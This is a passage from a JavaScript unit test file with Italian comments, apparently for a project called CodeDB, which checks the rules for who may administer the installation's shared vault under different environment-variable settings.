    const { isInstallAdmin, installAdminEmails } = require('../auth/permissions');
    const ownerA = { id: 'a', type: 'owner', owner: true, root: false, ownerId: 'a', email: 'a@azienda.it', capabilities: ['read', 'write', 'ddl', 'delete', 'manage'] };
    const ownerB = { ...ownerA, id: 'b', ownerId: 'b', email: 'b@azienda.it' };
    const sub = { id: 's', type: 'subuser', owner: false, root: false, ownerId: 'a', email: 'a@azienda.it', capabilities: [] };

    // RBAC spento: l'owner locale è l'amministratore della macchina.
    assert.strictEqual(isInstallAdmin(ROOT_PRINCIPAL, {}), true,
      'con RBAC spento il principal root amministra l\'installazione');

    // Self-hosted a un tenant solo: l'owner di CODEDB_OWNER_EMAIL continua a
    // poter cambiare la passphrase, ed è l'unico.
    const envLocale = { CODEDB_OWNER_EMAIL: 'A@Azienda.IT' };
    assert.strictEqual(isInstallAdmin(ownerA, envLocale), true,
      'l\'owner indicato in CODEDB_OWNER_EMAIL amministra l\'installazione (confronto senza maiuscole)');
    assert.strictEqual(isInstallAdmin(ownerB, envLocale), false,
      'un altro owner NON può toccare il vault condiviso');
    assert.strictEqual(isInstallAdmin(sub, envLocale), false,
      'un sottoutente non lo è nemmeno con la stessa email dell\'owner');

    // SaaS: nessuna delle due variabili, quindi nessun cliente può azzerare il
    // vault dell'istanza — l'operazione resta sulla macchina.
    assert.strictEqual(isInstallAdmin(ownerA, {}), false,
      'senza variabili d\'ambiente nessun owner amministra l\'installazione');

    // Elenco esplicito: vince su CODEDB_OWNER_EMAIL e ammette più account.
    const envElenco = { CODEDB_OWNER_EMAIL: 'z@azienda.it', CODEDB_VAULT_ADMINS: ' a@azienda.it , b@azienda.it ' };
    assert.strictEqual(isInstallAdmin(ownerA, envElenco), true, 'CODEDB_VAULT_ADMINS abilita A');
    assert.strictEqual(isInstallAdmin(ownerB, envElenco), true, 'CODEDB_VAULT_ADMINS abilita anche B');
    assert.strictEqual(isInstallAdmin({ ...ownerA, email: 'z@azienda.it' }, envElenco), false,
      'con CODEDB_VAULT_ADMINS impostata, CODEDB_OWNER_EMAIL da sola non basta più');

    assert.strictEqual(installAdminEmails({ CODEDB_VAULT_ADMINS: ' , ,' }).size, 0,
      'una lista di sole virgole non abilita nessuno');
    assert.strictEqual(isInstallAdmin({ ...ownerA, email: '' }, envLocale), false,
      'un owner senza email non corrisponde a nessuna voce dell\'elenco');
    console.log('  OK   Vault riservato all\'amministratore dell\'installazione (CDB-A02)');
  }

  console.log('\nTutti i test unitari RBAC superati!');
})().catch((err) => {
  console.error('  FAIL', err && err.message);
  process.exitCode = 1;
});
